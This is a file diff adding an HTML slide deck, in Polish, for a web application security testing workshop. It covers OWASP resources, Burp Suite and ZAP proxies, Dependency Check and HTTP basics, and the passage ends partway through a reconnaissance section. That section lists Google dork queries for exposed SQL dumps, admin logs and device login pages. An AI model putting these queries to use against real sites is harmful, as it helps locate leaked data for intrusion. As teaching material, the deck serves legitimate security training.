@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html class="js no-mobile desktop no-ie ff ff68 stacjait_warsztat_09022020-section w-1487 gt-240 gt-320 gt-480 gt-640 gt-768 gt-800 gt-1024 gt-1280 gt-1440 lt-1680 lt-1920 no-portrait landscape gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius no-cssreflections csstransforms csstransitions no-touch no-retina fontface domloaded" id="index-page" lang="pl"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta charset="utf-8">
+
+		<title>Praktyczne sposoby wykrywania podatności w aplikacjach webowych</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/reveal.css">
+		<link rel="stylesheet" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/white.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/zenburn.css">
+		
+		<style>
+			.reveal table th, .reveal table td {border-bottom: 0px;}
+			html.dimbg .slide-background {
+				opacity: 0.2 !important;
+			}
+			
+			#no-header {
+				visibility: hidden;
+				display: none;
+			}
+		</style>
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script><link rel="stylesheet" type="text/css" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/paper.css">
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]--><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/menu.js"></script>
+		
+		
+	<script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/highlight.js"></script><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/search.js"></script><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/zoom.js"></script><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/notes.js"></script><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/jeesh.js"></script><script type="text/javascript" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/bowser.js"></script><link rel="stylesheet" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/menu.css"><link rel="stylesheet" href="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/font-awesome.css"></head>
+
+	<body style="transition: transform 0.8s ease 0s;" class="">
+
+		<div class="reveal slide center has-vertical-slides has-horizontal-slides ready" role="application" data-transition-speed="default" data-background-transition="fade">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides" style="width: 960px; height: 700px; inset: 50% auto auto 50%; transform: translate(-50%, -50%) scale(1.25349);">
+				
+					<section data-background="pictures/tlo_1.jpg" data-state="dimbg" style="top: 119px; display: none;" data-background-image="pictures/tlo_1.jpg" class="past" data-node-uid="1" aria-hidden="true" hidden="">
+						<h2>Praktyczne sposoby wykrywania podatności w aplikacjach webowych</h2>
+						<p>
+							</p><h3>Stacja IT - Warsztat #350</h3>
+						<p></p>
+						<p style="text-align:right"><a href="http://www.linkedin.com/in/klara-trzcinska">Klara Trzcińska</a></p>
+					</section>
+				
+				<section style="top: 0px; display: block;" class="stack past" data-previous-indexv="2" aria-hidden="true" hidden="">	
+					<section style="top: 279.5px; display: none;" data-node-uid="2" class="past" aria-hidden="true" hidden="">
+						<h2>Informacje organizacyjne</h2>
+					</section>
+					
+					<section class="past" style="top: 31.5px; display: none;" data-node-uid="3" aria-hidden="true" hidden="">
+						<h3>O mnie</h3>
+						<p>Jestem specjalistką ds. zapewnienia jakości i bezpieczeństwa oprogramowania z doświadczeniem w <b>testach bezpieczeństwa aplikacji webowych</b>
+ oraz infrastruktury, testach wydajnościowych oraz testach technicznych.
+ Pracuję jako Główny Specjalista w firmie Pentacomp Systemy 
+Informatyczne, gdzie nie tylko wykonuje testy, ale także koordynuje 
+pracę zespołu.
+						Moim głownym zainteresowaniem są testy bezpieczeństwa aplikacji 
+webowych.</p>
+					</section>
+					
+					<section class="" style="top: 0px; display: block;" data-node-uid="4" aria-hidden="true">
+						<h3>O Pentacomp</h3>
+						<p>Jesteśmy niezależnym producentem rozwiązań informatycznych i 
+dostawcą profesjonalnych usług IT dla klientów z wybranych branż 
+gospodarki i sektora publicznego. Dysponujemy wieloletnim doświadczeniem
+ w realizacji strategicznych projektów dla największych w Polsce 
+organizacji.</p>				
+						<img alt="Pentacomp" style="border:none; box-shadow:none;" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/PC_Logo_www.jpg" data-lazy-loaded="" height="200">
+					</section>
+					
+					<section class="future" style="top: 18.5px; display: none;" data-node-uid="5" aria-hidden="true" hidden="">
+						<h3>O Women in Technology</h3>
+						<p>Jesteśmy społecznością kobiet skupionych wokół IT i nowych 
+technologii, zarówno ekspertek zajmujących stanowiska seniorskie, jak i 
+osób rozwijających swoje umiejętności. Tworzymy przestrzeń sprzyjającą 
+wymianie wiedzy i wspierającą rozwój.</p>
+						<img alt="Pentacomp" style="border:none; box-shadow:none;" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/nowe_logo_WiT-02.png" data-lazy-loaded="" height="200">
+					</section>
+					
+					<section class="future" style="top: 178px; display: none;" data-node-uid="6" aria-hidden="true" hidden="">
+                        <h3>Kwestie organizacyjne</h3>
+                        <ul>
+                            <li>Jeśli nikt nie ma nic przeciwko, zwracajmy się na "Ty".</li>
+                            <li>Co około 90 minut zrobimy 10-minutową przerwę.</li>
+                            <li>Pytania zadawajcie na bieżąco.</li>
+                        </ul>
+                    </section>
+					
+					<section class="future" style="top: 205.5px; display: none;" data-node-uid="7" aria-hidden="true" hidden="">
+                        <h3>O was</h3>
+                        <ul>
+							<li>Czy masz jakieś doświadczenie w testach bezpieczeństwa?</li>
+                            <li>Czego oczekujesz od szkolenia?</li>
+                        </ul>
+                    </section>
+					
+					<section class="future" style="top: 222.5px; display: none;" data-node-uid="8" aria-hidden="true" hidden="">
+                        <h3>Code of Ethics</h3>
+                        <p>Prezentowanych na warsztatach technik nie stosujemy na systemach bez zgody właściciela.</p>
+                    </section>
+					
+					<section class="future" style="top: 150px; display: none;" data-node-uid="9" aria-hidden="true" hidden="">
+                        <h3>Korzystanie z prezentacji</h3>
+                        <ul>
+                            <li>Kliknięcie ESC wyświetla widok aktualnego slajdu i pozostałych slajdów.</li>
+							<li>Wybranie ikony w lewym dolnym rogu lub wciśnięcie klawisza <i>m</i> powoduje pojawienie się menu nawigacyjnego.</li>   
+                        </ul>
+                    </section>
+					
+					<section class="future" style="top: 123.5px; display: none;" data-node-uid="10" aria-hidden="true" hidden="">
+					<h3>Agenda (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li>Skanowanie portów</li>
+						</ul>
+					</section>
+					
+					<section class="future" style="top: 96px; display: none;" data-node-uid="11" aria-hidden="true" hidden="">
+					<h3>Agenda (II)</h3>
+						<ul>
+							<li>Przegląd baz danych podatności</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+							<li><b>Przerwa obiadowa ok. 13:00</b></li>
+							<li>Ataki CSRF, przygotowanie przykładowej strony HTML wykonującej atak</li>
+						</ul>
+					</section>
+					
+					<section class="future" style="top: 69px; display: none;" data-node-uid="12" aria-hidden="true" hidden="">
+					<h3>Agenda (III)</h3>
+						<ul>
+							<li>SQL Injection</li>
+							<li>Podatności kategorii Broken Access Control</li>
+							<li>Podsłuchanie komunikacji nieszyfrowanej z wykorzystaniem Wireshark</li>
+							<li>Ataki Slow HTTP</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+							<li>Nagłówki bezpieczeństwa</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: block;" class="stack past" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 279.5px; display: block;" data-node-uid="13" class="" aria-hidden="true">
+						<h2>Wprowadzenie</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 161.5px; display: block;" data-node-uid="14" hidden="">
+						<h3>Jakie są najczęściej występujące podatności aplikacji webowych? O jakich podatnościach ostatnio słyszeliście?</h3>
+						<small>
+						<a href="https://www.commonplaces.com/blog/6-common-website-security-vulnerabilities/">Most Common Website Security Vulnerabilities</a>
+						</small>
+					</section>				
+					
+					<section class="future" aria-hidden="true" style="top: 0px; display: none;" data-node-uid="15" hidden="">
+						<h3>Statystyki 2014 - 2018 - raport Imperva</h3>
+						<img alt="Statystyki Imperva" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/statistics2018.png" data-lazy-loaded="" height="360">
+						<p>Statystyki podatności w latach 2014 - 2018 według <a href="https://www.imperva.com/blog/the-state-of-web-application-vulnerabilities-in-2018/">raportu</a> Imperva</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="16" hidden="">
+                        <h3>Motywacja</h3>
+                        <ul>
+                            <li>Wykonanie podstawowych testów bezpieczeństwa nie jest trudne.</li>
+							<li>Umiejętność wykrywania podstawowych podatności pomoże wykryć je na wczesnym etapie projektu.</li>
+							<li>Im wcześniej błąd zostanie wykryty tym łatwiej i taniej jest go naprawić.</li>
+                        </ul>
+                    </section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="17" hidden="">
+                        <h3>Test penetracyjny</h3>
+                        <ul>
+                            <li>Kontrolowany atak na system teleinformatyczny.</li>
+							<li>Umożliwia praktyczną ocenę stanu bezpieczeństwa.</li>
+							<li>Pentester wciela się w rolę potencjalnego włamywacza.</li>
+                        </ul>
+                    </section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="18" hidden="">
+					<h3>Test penetracyjny - audyt - test bezpieczeństwa</h3>
+						<ul>
+                            <li>Pentest nie jest audytem. Audyt sprawdza zgodność z formalną specyfikacją stanu pożądanego (normą, aktem prawnym).</li>
+							<li>Test bezpieczeństwa jest pojęciem bardzo szerokim.</li>
+							<li>Testy bezpieczeństwa są często elementem testów pozafunkcjonalnych.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="19" hidden="">
+						<h3>Ile milionów haseł uzytkowników Facebooka było dostępnych bez szyfrowania?</h3>
+						<small>
+						<a href="https://niebezpiecznik.pl/post/600-milionow-hasel-facebook-wyciek/">Hasła *** milionów użytkowników Facebooka były dostępne bez szyfrowania. Przez przypadek…</a>
+						</small>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: block;" class="stack present" data-previous-indexv="8">
+					<section style="top: 279.5px; display: none;" data-node-uid="20" class="past" aria-hidden="true" hidden="">
+						<h2>Lokalne Proxy</h2>
+					</section>
+					
+					<section class="past" aria-hidden="true" style="top: 178px; display: none;" data-node-uid="21" hidden="">
+						<h3>Kilka pytań :)</h3>
+						<ul>
+							<li>Kto korzystał z narzędzi deweloperskich przegladarki?</li>
+							<li>Kto korzystał z narzędzi typu lokalnego Proxy?</li>
+							<li>Kto widział różnice między metodami GET i POST?</li>
+						</ul>
+					</section>
+					
+					<section class="past" aria-hidden="true" style="top: 0px; display: none;" data-node-uid="22" hidden="">
+						<h3>Narzędzia typu lokalnego Proxy</h3>
+							<ul>
+								<li>Proxy jest zainstalowane na komputerze testującego.</li>
+								<li>Przeglądarka łączy się z Proxy, a następnie Proxy łączy się z żądaną stroną internetową.</li>
+								<li>Dzięki takiemu połączeniu możliwe jest przechwytywanie oraz zmiana danych wysyłanych pomiędzy przeglądarką, a serwerem.</li>
+							</ul>
+							<img alt="Proxy Lokalne" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/Obraz5.png" data-lazy-loaded="" height="158">
+					</section>
+					<section class="past" aria-hidden="true" style="top: 57px; display: none;" data-node-uid="23" hidden="">
+						<h3>Burp Suite (I)</h3>
+						<img alt="Burp Suite" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/burp.jpg" data-lazy-loaded="" height="258">
+						<p>Bardzo popularne narzędzie wykorzystywane podczas testów bezpieczeństwa.</p>
+					</section>
+					<section class="past" style="top: 96px; display: none;" data-node-uid="24" aria-hidden="true" hidden="">
+						<h3>Burp Suite (II)</h3>
+							<ul>
+								<li>Szczegółowa analiza i obróbka zapytań oraz odpowiedzi.</li>
+								<li>Możliwość powtórzenia i modyfikowania przesłanych wcześniej żądań.</li>
+								<li>Łatwe przenoszenie zapytań pomiędzy różnymi narzędziami.</li>
+								<li>Skaner automatyczny (pasywny i aktywny).</li>
+							</ul>
+					</section>
+					<section class="past" style="top: 0px; display: none;" data-node-uid="25" aria-hidden="true" hidden="">
+						<h3>Instalacja certyfikatu Burp - Firefox</h3>
+						<img alt="Burp Suite" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/BurpCA.png" data-lazy-loaded="" height="350">
+						<p>Podczas importu certyfikatu należy zaznaczyć opcję <i>Trust this CA to identify web sites</i></p>
+					</section>
+					
+					<section class="past" style="top: 0px; display: none;" data-node-uid="26" aria-hidden="true" hidden="">
+						<h3>Instalacja certyfikatu Burp - IE</h3>
+						<img alt="Burp Suite" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/ie_cert.png" data-lazy-loaded="" height="400">
+						<p><small><i>The Chrome browser picks up the certificate trust 
+store from your host computer. By installing Burp's CA certificate in 
+your computer’s built-in browser (e.g. Internet Explorer on Windows, or 
+Safari on OS X), Chrome will automatically make use of the certificate.</i></small></p>
+					</section>
+					
+					<section class="past" style="top: 52.5px; display: block;" data-node-uid="27" aria-hidden="true" hidden="">
+						<h3>Instalacja certyfikatu Burp</h3>
+						<center>
+							<video autoplay="true" loop="true" muted="true" data-paused-by-reveal="" width="640">
+							   <source src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/1080_InstallingAndConfiguring_Install%2520Certificate.mp4" type="video/mp4"> Your browser does not support the video tag.
+							</video>
+						</center>
+						<p><a href="https://support.portswigger.net/customer/portal/articles/1783075-Installing_Installing%20CA%20Certificate.html">Szczegółowe informacje</a></p>
+						</section>
+					
+					<section class="past" style="top: 123.5px; display: block;" data-node-uid="28" aria-hidden="true" hidden="">
+						<h3>Burp Suite Professional</h3>
+							<ul>
+								<li>Różnice między wersją Community i Professional.</li>
+								<li>Nowości w wersji Burp Suite 2.0 beta m. in. w skanerze automatycznym.</li>
+								<li>Kilka praktycznych wskazówek - logowanie NTLM (platform authentication) i certyfikat SSL po stronie klienta.</li>
+							</ul>
+					</section>
+					
+					<section class="present" style="top: 0px; display: block;" data-node-uid="29">
+						<h3>Prezentacja OWASP ZAP</h3>
+						<img alt="OWASP ZAP" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/zap.png" data-lazy-loaded="" height="558">
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: block;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 0px; display: block;" data-node-uid="30" class="" aria-hidden="true">
+						<h3>BadStore - aplikacja do ćwiczeń</h3>
+						<img alt="Burp Suite" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/BadStore.png" data-lazy-loaded="" height="350">
+						<p>Aplikacja dosyć stara, pierwsze wydanie 2004 rok ale nadal 
+opisywana na blogach, posiada praktycznie wszystkie najważniejsze 
+podatności.</p>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: block;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 78px; display: block;" data-node-uid="31" class="" aria-hidden="true">
+						<h2>Ćwiczenie 1</h2>
+						<p style="text-align: left;">Konfiguracja lokalnego Proxy i przechwytywanie żądań do aplikacji.
+						Aplikacja do testów znajduje się pod adresem <a href="http://www.badstore.net/">www.badstore.net</a>.
+						Aby mieć dostęp do aplikacji należy:</p>
+						<ul>
+								<li>Otworzyć plik C:\Windows\System32\drivers\etc\hosts,</li>
+								<li>Dodać wpis <i>adres_ip www.badstore.net</i>.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" class="stack future" data-previous-indexv="0" aria-hidden="true" hidden="">
+					<section style="top: 279.5px; display: none;" data-node-uid="32" class="" aria-hidden="true">
+						<h2>OWASP</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 150.5px; display: none;" data-node-uid="33" hidden="">
+						<h3>Organizacja OWASP</h3>
+						Open Web Application Security Project (OWASP) – organizacja 
+non-profit, której celem jest poprawa stanu bezpieczeństwa aplikacji 
+poprzez tworzenie artykułów, metodologii, dokumentacji, narzędzi i 
+technologii o otwartym dostępie.
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 123.5px; display: none;" data-node-uid="34" hidden="">
+						<h3>Projekty OWASP</h3>
+						<ul>
+							<li>OWASP Top 10</li>
+							<li>OWASP Testing Guide</li>
+							<li>OWASP Cheat Sheet Series</li>
+							<li>OWASP Application Security Verification Standard (ASVS)</li>
+							<li>OWASP Top 10 Proactive Controls</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="35" hidden="">
+						<h3>OWASP Cheat Sheet Series</h3>
+						<img alt="OWASP Cheat Sheet Series" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/Preface_Cheatsheet_Logo.png" data-lazy-loaded="" height="458">
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="36" hidden="">
+						<h3>OWASP Top 10 (2017)</h3>
+						<ul>
+							<li>A1 Injection</li>
+							<li>A2 Broken Authentication</li>
+							<li>A3 Sensitive Data Exposure</li>
+							<li>A4 XML External Entities (XXE)</li>
+							<li>A5 Broken Access Control</li>
+							<li>A6 Security Misconfiguration</li>
+							<li>A7 Cross-Site Scripting (XSS)</li>
+							<li>A8 Insecure Deserialization</li>
+							<li>A9 Using Components with Known Vulnerabilities</li>
+							<li>A10 Insufficient Logging &amp; Monitoring</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="37" hidden="">
+						<h3>OWASP Top 10 (2017) - Linki</h3>
+						<img alt="OWASP Top 10" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/owasp2.png" data-lazy-loaded="" height="500">
+						<br>
+						<small>
+						<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP Top 10 Project</a> |
+						<a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf">OWASP Top 10 2017 - PDF</a>
+						</small>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="38" hidden="">
+						<h3>OWASP Top Ten Proactive Controls</h3>
+						<ul>
+							<li>C1: Define Security Requirements</li>
+							<li>C2: Leverage Security Frameworks and Libraries</li>
+							<li>C3: Secure Database Access</li>
+							<li>C4: Encode and Escape Data</li>
+							<li>C5: Validate All Inputs</li>
+							<li>C6: Implement Digital Identity</li>
+							<li>C7: Enforce Access Controls</li>
+							<li>C8: Protect Data Everywhere</li>
+							<li>C9: Implement Security Logging and Monitoring</li>
+							<li>C10: Handle All Errors and Exceptions</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="39" hidden="">
+						<h3>Narzędzie OWASP ZAP</h3>
+						<ul>
+							<li>Lokalne proxy przechwytujące</li>
+							<li>Spider</li>
+							<li>Aktywne skanowanie</li>
+							<li>Fuzzer (przesyłaniu aplikacji niepoprawnych lub nieprzewidzianych danych)</li>
+							<li>Liczne dodatki</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="40" hidden="">
+						<h3>OWASP Dependency Check (I)</h3>
+						<ul>
+							<li>Do poprawnego przeskanowania aplikacji niezbędne jest 
+zbudowanie projektu. Na przykład, w przypadku aplikacji pisanych w .NET 
+należy wskazać folder bin z plikami wyjściowymi, który zawiera pliki 
+.dll, a w aplikacjach pisanych w języku Java należy użyć folderu gdzie 
+znajdują się pliki wyjściowe np. .jar.</li> 
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="41" hidden="">
+						<h3>OWASP Dependency Check (II)</h3>
+						<ul>
+							<li>Przewagą narzędzia nad analizatorami kodu jest taka, że nie 
+jest potrzebny kod źródłowy do działania OWASP Dependency Check. 
+Wystarczy jedynie zbudowana paczka z aplikacją.</li>
+							<li>Narzędzie generuje raport w formacie .html z podsumowaniem testów.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="42" hidden="">
+						<h3>OWASP Dependency Check (III)</h3>
+						<img alt="OWASP Dependency Check" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/Dependency.png" data-lazy-loaded="" height="360">
+						<p><a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">Pobranie OWASP Dependency Check</a></p>
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 71px; display: none;" data-node-uid="43">
+						<h2>Ćwiczenie 2</h2>
+						<p>Skanowanie przykłądowej aplikacji .jar z wykorzystaniem narzędzia OWASP Dependency Check.<br><br>
+						Narzędzie uruchamia się z linii poleceń:</p> 
+						<pre><code class="hljs stylus" data-trim="" contenteditable="">dependency-check<span class="hljs-selector-class">.bat</span> --project <span class="hljs-string">"Nazwa_Projektu"</span> --scan <span class="hljs-string">"Ścieżka/do/folderu/z/plikami/wyjściowymi"</span></code></pre>
+						Weryfikacja wygenerowanego raportu. 
+					</section>
+				</section>
+				
+				<section style="top: 0px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 239.5px; display: none;" data-node-uid="44">
+						<h2>Aplikacja webowa - podstawowe informacje</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="45">
+						<h3>Definicja</h3>
+						<p><i>Program komputerowy, który pracuje na serwerze i komunikuje 
+się poprzez sieć komputerową z hostem użytkownika komputera z 
+wykorzystaniem przeglądarki internetowej użytkownika, będącego w takim 
+przypadku interaktywnym klientem aplikacji internetowej.</i></p><p>
+					</p></section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="46">
+						<h3>Model Klient - Serwer</h3>
+						<ul>
+							<li>Klient wysyła żądanie (<i>request</i>) do serwera.</li>
+							<li>Żądanie zawiera URL (Uniform Resource Locator).</li>
+							<li>Serwer zwraca zasób, jeżeli jest dostępny (<i>response</i>).</li>
+							<li>HTTP jest protokołem bezstanowym.</li>
+							<li>Istnieją mechanizmy zapewniające emulację stanów - sesje, ciasteczka.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="47">
+						<h3>URL</h3>
+						<img alt="URL" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/url.PNG" data-lazy-loaded="" height="200">
+						<ul>
+							<li>host - adres serwera, w postaci domenowej lub adresu IP,</li>
+							<li>port - numer portu, na którym serwer odbiera połączenia TCP (80, 443, 8080),</li>
+							<li>path - ścieżka dostępu do zasobu, jeżeli nieobecna podaje się "/".</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="48">
+						<h3>Żądanie</h3>
+						<ul>
+							<li>Wybór metody,</li>
+							<li>Adres zasobu,</li>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="49">
+						<h3>Metoda GET</h3>
+						<p>Polega na umieszczeniu par parametr=wartość w adresie strony, np. <i>index.php?lang=pl&amp;cat=2&amp;sidebar=yes</i></p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="50">
+						<h3>Metoda POST</h3>
+						<p>Metoda POST powinna być stosowana tam, gdzie dane odwołanie 
+jest formą interakcji z użytkownikiem, niemożliwą do utrwalenia w formie
+ adresu. Powinna być także stosowana tam, gdzie dana operacja może 
+wywołać wiążące dla użytkownika skutki – np. zapisanie na listę 
+dyskusyjną.</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="51">
+						<h3>Odpowiedź</h3>
+						<ul>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Status odpowiedzi - trzycyfrowy kod np. 200 OK, 301 Moved Permanently, 404 Not found,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="52">
+						<h3>Dane wrażliwe w GET (I)</h3>
+						<ul>
+							<li>Przykład przekazywania danych wrażliwych z Amerykańskiego serwisu <b>HealthCare.gov</b> do serwisów śledzących aktywność użytkownika.</li>
+							<li>Aplikacja przetwarzająca dane medyczne, w której konta mają 
+miliony amerykanów - HealthCare.gov przekazywała dane o stanie zdrowia 
+użytkowników do zewnętrznych systemów monitorujących ich aktywność.</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="53">
+						<h3>Dane wrażliwe w GET (II)</h3>
+						<ul>
+							<li>Dane były przekazywane poprzez nagłówek Referer (HTTP Referer
+ to adres strony internetowej, z której użytkownik został przekierowany 
+za pomocą odnośnika; przeglądarka internetowa przekazuje Referer 
+serwerowi WWW w nagłówku żądania HTTP).</li>
+							<li>Przekazywane dane zawierały m. in. kod pocztowy, poziom 
+dochodów, informacje na temat palenia tytoniu i ciąży. Błąd został 
+wykryty w styczniu 2015 roku. <a href="https://www.eff.org/pl/deeplinks/2015/01/healthcare.gov-sends-personal-data">Więcej informacji...</a></li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="54">
+						<h3>Dane wrażliwe w GET (III)</h3>
+						<img alt="HC_GOV" src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/hc_gov_requests.png" data-lazy-loaded="">
+					</section>
+				</section>	
+				
+				<section style="top: 350px; display: none;" aria-hidden="true" class="stack future" hidden="">
+					<section style="top: 350px; display: none;" data-node-uid="55">
+						<h2>Google Hacking</h2>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="56">
+						<h3>Definicja</h3>
+						<p>Google hacking to technika wyszukiwania poufnych informacji w wyszukiwarce Google, za pomocą specjalnie dobranych zapytań.</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="57">
+						<h3>Przykładowe zapytania (I)</h3>
+						<p>
+						<a href="https://pentest-tools.com/information-gathering/google-hacking">Aplikacja internetowa</a>
+ pozwala na wpisanie adresu domeny, a następnie wybraniu interesującej 
+kategorii wyszukiwania. Wybranie kategorii powoduje pojawienie się okna 
+popup z wynikiem wyszukiwania danego zapytania w Google.
+						</p>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="58">
+						<h3>Przykładowe zapytania (II)</h3>
+						<ul>
+							<li>filetype:sql "Dumping data for table"</li>
+							<li>"admin account info" filetype:log</li>
+							<li>inurl:hp/device/this.LCDispatcher</li>
+							<li>intitle:"toshiba network camera -user login"</li>
+						</ul>
+					</section>
+					
+					<section class="future" aria-hidden="true" style="top: 350px; display: none;" data-node-uid="59">
+						<h3>Shodan</h3>
+						<ul>
+							<li>Shodan pozwala na wyszukiwanie komputerów, rozmaitych 
+urządzeń sieciowych, a nawet pracujących na nich specyficznych wersji 
+oprogramowania.</li>
+							<li>Technicznie działa jak skaner portów.</li>
+							<li>Tworzy bazę otwartych portów i dostepnych usług (nagłowki odpowiedzi).</li>
